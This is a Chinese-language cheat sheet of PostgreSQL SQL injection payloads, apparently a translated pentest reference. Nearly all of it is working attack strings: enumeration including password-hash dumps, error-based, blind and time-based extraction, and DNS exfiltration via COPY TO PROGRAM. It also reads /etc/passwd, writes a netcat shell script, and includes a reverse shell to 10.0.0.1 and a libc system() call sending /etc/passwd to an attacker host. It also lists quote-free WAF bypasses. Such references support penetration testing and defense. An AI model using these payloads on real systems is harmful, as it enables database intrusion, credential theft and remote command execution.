# PostgreSQL 注入

> PostgreSQL SQL 注入是指攻击者利用未正确清理的用户输入，在 PostgreSQL 数据库中执行未经授权的 SQL 命令的安全漏洞。

## 概述

* [PostgreSQL 注释](#postgresql-注释)
* [PostgreSQL 枚举](#postgresql-枚举)
* [PostgreSQL 方法论](#postgresql-方法论)
* [PostgreSQL 基于错误的注入](#postgresql-基于错误的注入)
    * [PostgreSQL XML 辅助工具](#postgresql-xml辅助工具)
* [PostgreSQL 盲注](#postgresql-盲注)
    * [PostgreSQL 带有子字符串等价的盲注](#postgresql-带有子字符串等价的盲注)
* [PostgreSQL 基于时间的注入](#postgresql-基于时间的注入)
* [PostgreSQL 外部连接注入](#postgresql-外部连接注入)
* [PostgreSQL 堆叠查询注入](#postgresql-堆叠查询注入)
* [PostgreSQL 文件操作](#postgresql-文件操作)
    * [PostgreSQL 文件读取](#postgresql-文件读取)
    * [PostgreSQL 文件写入](#postgresql-文件写入)
* [PostgreSQL 命令执行](#postgresql-命令执行)
    * [使用 COPY TO/FROM PROGRAM](#使用-copy-tofrom-program)
    * [使用 libc.so.6](#使用-libcso6)
* [PostgreSQL WAF 绕过](#postgresql-waf绕过)
    * [引号的替代方案](#引号的替代方案)
* [PostgreSQL 权限](#postgresql-权限)
    * [PostgreSQL 列出权限](#postgresql-列出权限)
    * [PostgreSQL 超级用户角色](#postgresql-超级用户角色)
* [参考文献](#参考文献)

## PostgreSQL 注释

| 类型                 | 注释       |
| -------------------- | ---------- |
| 单行注释             | `--`      |
| 多行注释             | `/**/`    |

## PostgreSQL 枚举

| 描述                   | SQL 查询                                |
| ---------------------- | --------------------------------------- |
| 数据库管理系统版本      | `SELECT version()`                      |
| 当前数据库名称         | `SELECT CURRENT_DATABASE()`             |
| 当前数据库模式         | `SELECT CURRENT_SCHEMA()`               |
| 列出 PostgreSQL 用户   | `SELECT usename FROM pg_user`           |
| 列出密码哈希值         | `SELECT usename, passwd FROM pg_shadow` |
| 列出数据库管理员       | `SELECT usename FROM pg_user WHERE usesuper IS TRUE` |
| 当前用户              | `SELECT user;`                          |
| 当前用户              | `SELECT current_user;`                  |
| 当前用户              | `SELECT session_user;`                  |
| 当前用户              | `SELECT usename FROM pg_user;`          |
| 当前用户              | `SELECT getpgusername();`               |

## PostgreSQL 方法论

| 描述                   | SQL 查询                                    |
| ---------------------- | -------------------------------------------- |
| 列出模式               | `SELECT DISTINCT(schemaname) FROM pg_tables` |
| 列出数据库             | `SELECT datname FROM pg_database`            |
| 列出表                 | `SELECT table_name FROM information_schema.tables` |
| 列出表                 | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'` |
| 列出表                 | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'` |
| 列出列                 | `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'` |

## PostgreSQL 基于错误的注入

| 名称         | 负载         |
| ------------ | --------------- |
| CAST | `AND 1337=CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC) -- -` |
| CAST | `AND (CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC)) -- -` |
| CAST | `AND CAST((SELECT version()) AS INT)=1337 -- -` |
| CAST | `AND (SELECT version())::int=1 -- -` |

```sql
CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)
CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--
CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--
CAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)
```

```sql
' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
```

### PostgreSQL XML 辅助工具

```sql
SELECT query_to_xml('select * from pg_user',true,true,''); -- 返回所有结果为单个XML行
```

上述 `query_to_xml` 将指定查询的所有结果作为单个结果返回。将其与 [PostgreSQL 基于错误的注入](#postgresql-基于错误的注入) 技术结合使用，无需担心将查询限制为一个结果即可提取数据。

```sql
SELECT database_to_xml(true,true,''); -- 将当前数据库转储到XML
SELECT database_to_xmlschema(true,true,''); -- 将当前数据库转储为XML模式
```

注意，对于上述查询，输出需要在内存中组装。对于较大的数据库，这可能会导致性能下降或服务中断。

## PostgreSQL 盲注

### PostgreSQL 带有子字符串等价的盲注

| 函数    | 示例                                         |
| ------- | ------------------------------------------- |
| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`           |
| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        |
| `SUBSTRING` | `SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` |

示例：

```sql
' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE
' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE
```

## PostgreSQL 基于时间的注入

### 确认基于时间的注入

```sql
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))
```

### 基于时间的数据库转储

```sql
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
```

### 基于时间的表转储

```sql
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
```

### 基于时间的列转储

```sql
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1
```

```sql
AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```

## PostgreSQL 外部连接注入

PostgreSQL 的外部连接注入依赖于可以与文件系统或网络交互的功能，如 `COPY`、`lo_export` 或扩展中的函数，这些函数可以执行网络操作。其思想是利用数据库将数据发送到其他地方，攻击者可以监控和拦截。

```sql
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

## PostgreSQL 堆叠查询

使用分号 "`;`" 添加另一个查询

```sql
SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--
```

## PostgreSQL 文件操作

### PostgreSQL 文件读取

注意：较早版本的 Postgres 在 `pg_read_file` 或 `pg_ls_dir` 中不接受绝对路径。较新版本（自 [0fdc8495bff02684142a44ab3bc5b18a8ca1863a](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) 提交起）将允许超级用户或 `default_role_read_server_files` 组中的用户读取任何文件/文件路径。

* 使用 `pg_read_file` 和 `pg_ls_dir`

    ```sql
    select pg_ls_dir('./');
    select pg_read_file('PG_VERSION', 0, 200);
    ```

* 使用 `COPY`

    ```sql
    CREATE TABLE temp(t TEXT);
    COPY temp FROM '/etc/passwd';
    SELECT * FROM temp limit 1 offset 0;
    ```

* 使用 `lo_import`

    ```sql
    SELECT lo_import('/etc/passwd'); -- 将文件创建为大对象并返回 OID
    SELECT lo_get(16420); -- 使用上面返回的 OID
    SELECT * from pg_largeobject; -- 或者获取所有大对象及其数据
    ```

### PostgreSQL 文件写入

* 使用 `COPY`

    ```sql
    CREATE TABLE nc (t TEXT);
    INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');
    SELECT * FROM nc;
    COPY nc(t) TO '/tmp/nc.sh';
    ```

* 使用 `COPY`（一行）

    ```sql
    COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
    ```

* 使用 `lo_from_bytea`、`lo_put` 和 `lo_export`

    ```sql
    SELECT lo_from_bytea(43210, 'your file data goes in here'); -- 创建一个具有 OID 43210 和一些数据的大对象
    SELECT lo_put(43210, 20, 'some other data'); -- 在偏移量 20 处向大对象附加数据
    SELECT lo_export(43210, '/tmp/testexport'); -- 将数据导出到 /tmp/testexport
    ```

## PostgreSQL 命令执行

### 使用 COPY TO/FROM PROGRAM

运行 Postgres 9.3 及以上版本的安装具有功能，允许超级用户和具有 '`pg_execute_server_program`' 权限的用户通过 `COPY` 管道到外部程序。

```sql
COPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

```sql
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';
```

### 使用 libc.so.6

```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
```

## PostgreSQL WAF 绕过

### 引号的替代方案

| 负载              | 技术       |
| ------------------ | ---------- |
| `SELECT CHR(65)\|\|CHR(66)\|\|CHR(67);` | 使用 `CHR()` 的字符串 |
| `SELECT $TAG$This` | 美元符号（>= 版本 8 PostgreSQL） |

## PostgreSQL 权限

### PostgreSQL 列出权限

检索当前用户的表级别权限，排除 `pg_catalog` 和 `information_schema` 系统模式中的表。

```sql
SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');
```

### PostgreSQL 超级用户角色

```sql
SHOW is_superuser; 
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```

## 参考文献

* [渗透测试人员的 PostgreSQL 指南 - David Hayter - 2017年7月22日](https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)
* [高级 PostgreSQL SQL 注入和过滤器绕过技术 - Leon Juranic - 2009年6月17日](https://www.infigo.hr/files/INFIGO-TD-2009-04_PostgreSQL_injection_ENG.pdf)
* [认证的任意命令执行在 PostgreSQL 9.3 > 最新版本 - GreenWolf - 2019年3月20日](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)
* [Postgres SQL 注入速查表 - @pentestmonkey - 2011年8月23日](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
* [PostgreSQL 9.x 远程命令执行 - dionach - 2017年10月26日](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
* [SQL 注入 /webApp/oma_conf ctx 参数 - Sergey Bobrov (bobrov) - 2016年12月8日](https://hackerone.com/reports/181803)
* [SQL 注入和 Postgres - 通往最终 RCE 的冒险 - Denis Andzakovic - 2020年5月5日](https://pulsesecurity.co.nz/articles/postgres-sqli)